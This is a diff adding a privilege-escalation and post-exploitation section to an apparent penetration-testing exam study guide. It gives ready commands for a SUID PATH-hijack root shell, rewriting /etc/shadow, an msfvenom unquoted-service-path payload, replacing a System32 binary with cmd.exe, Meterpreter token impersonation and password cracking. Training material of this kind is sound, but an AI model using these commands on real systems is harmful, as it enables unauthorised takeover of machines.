@@ -459,6 +459,129 @@ Kali ships ready-to-use web shells and binaries under /usr/share. Below are the 
 
 This uses the stable shell (Session 1) to upload and run a new Meterpreter payload, yielding a fresh Meterpreter session (Session 2) with higher reliability.
 
+Metasploit modules useful for quick triage:
+
+- `post/windows/gather/checkvm`
+- `post/windows/gather/enum_applications`
+- `post/windows/gather/enum_logged_on_users`
+- `post/linux/gather/enum_configs`
+- `post/linux/gather/enum_system`
+
+Automated local enumeration tools:
+- Windows: JAWS
+- Linux: LinEnum
+
+## Privilege Escalation Execution
+
+### Linux
+
+- Sudo abuse
+  - Observe: `sudo -l` shows `(ALL) NOPASSWD: <process>`
+  - Act: Check GTFOBins for a matching execution method.
+- SUID abuse
+  - Observe: `find / -user root -perm -u=s -type f 2>/dev/null` returns `<process>`
+  - Act: Check GTFOBins for a matching execution method.
+- SUID path hijacking
+  - Observe: `find / -user root -perm -u=s -type f 2>/dev/null` reveals a non-standard custom binary `<custom_binary>`
+  - Analysis: `strings <custom_binary>` shows it invokes a command without an absolute path
+  - Hijack:
+  ```bash
+  cat > /tmp/<invoked_command> <<'EOF'
+  #!/bin/bash
+  /bin/bash -p
+  EOF
+  chmod +x /tmp/<invoked_command>
+  export PATH=/tmp:$PATH
+  ./<custom_binary>
+  ```
+- Writable `/etc/shadow`
+  - Observe: `ls -l /etc/shadow` shows the current user can write to the file
+  - Act:
+    ```bash
+    openssl passwd -1 -salt new "new_password"
+    # Edit /etc/shadow and add/replace the hash accordingly
+    vim /etc/shadow
+    su root  # enter the new password
+    ```
+
+### Windows
+
+- Meterpreter basics
+  - Observe: A Meterpreter session is established
+  - Act:
+    ```text
+    meterpreter > migrate -N explorer.exe
+    meterpreter > getsystem
+    ```
+
+- AlwaysInstallElevated
+  - Observe: Query both registry keys; both values are 1
+    ```text
+    reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+    ```
+  - Act: Generate an MSI payload with msfvenom, upload to the target, set a listener/handler, then execute it
+
+- Unquoted service paths
+  - Observe: During local enumeration, find a service with an unquoted path
+  - Act:
+    1) Generate `C:\\Program.exe` with msfvenom and upload it to the target
+    ```bash
+    msfvenom -p windows/x64/exec CMD="cmd.exe" -f exe -o C:\\Program.exe
+    ```
+    2) Restart the vulnerable service
+    ```cmd
+    sc stop <vulnerable_service>
+    sc start <vulnerable_service>
+    ```
+
+- UAC bypass
+  - Observe: Current account is in Administrators, but `getsystem` failed
+  - Act: Use `exploit/windows/local/bypassuac_injection` to escalate to a high-integrity context
+
+- File permission abuse
+  - Observe: Target file/dir owned by SYSTEM/Admins but ACLs allow modification; standard user can run takeown/icacls
+  - Act:
+    ```cmd
+    C:\> takeown /f C:\Windows\System32\<vulnerable_binary>
+    C:\> icacls C:\Windows\System32\<vulnerable_binary> /grant <current_account>:F
+    copy C:\Windows\System32\cmd.exe C:\Windows\System32\<vulnerable_binary>
+    ```
+
+- SeImpersonate
+  - Observe: Current token has `SeImpersonatePrivilege`
+  - Act:
+    ```text
+    meterpreter > load incognito
+    meterpreter > list_tokens -u
+    meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
+    ```
+
+### Crack hashed passwords
+
+```bash
+john --wordlist=<wordlist> hashes.txt --format=<format>
+hashcat -m <hash_type_code> hashes.txt <wordlist>
+```
+> Tip: `hashid` helps identify the hash type.
+
+## The OODA Loop in the Post-Exploitation Phase
+
+- Observe: Perform a 5-minute triage
+- Orient: Identify the highest-value next action, not just privilege escalation. Triage may reveal:
+  - Path A (Pivot): `ip a` / `ipconfig` shows an internal NIC (e.g., 10.x.x.x)
+  - Path B (Easy privesc): `whoami /priv` shows `SeImpersonatePrivilege` or `sudo -l` shows `(ALL) NOPASSWD:`
+  - Path C (Local enumeration): `netstat` shows a service bound to `127.0.0.1` (e.g., MySQL)
+  - Path D (Hard privesc): Only complex kernel/service abuse remains
+- Decide (Expert priority framework):
+  - Logic: 35 questions across multiple hosts. Unlocking a new subnet (Path A) is usually worth more than root on the current host (Path B/D)
+  - Rationale: Pivoting can unlock multiple machines/questions; privesc typically yields fewer points on a single host
+  - Priority order:
+    1. Pivoting (lateral movement). If triage found a new subnet, pivot now. Do not chase root first
+    2. Auditing. Run the manual enumeration checklist (Core Tables 4 & 5) and save outputs to notes
+    3. Easy privesc. Execute quick wins (e.g., `sudo vim`, token impersonation). After root, rerun audits with elevated rights
+    4. Hard privesc. Stop early if only complex vectors remain; spend time on other hosts
+
 #### Issue 2 Cannot Find Vulnerable Component
 
 - Orient: Exploiting vulnerabilities (e.g., `vsftpd_234_backdoor`)
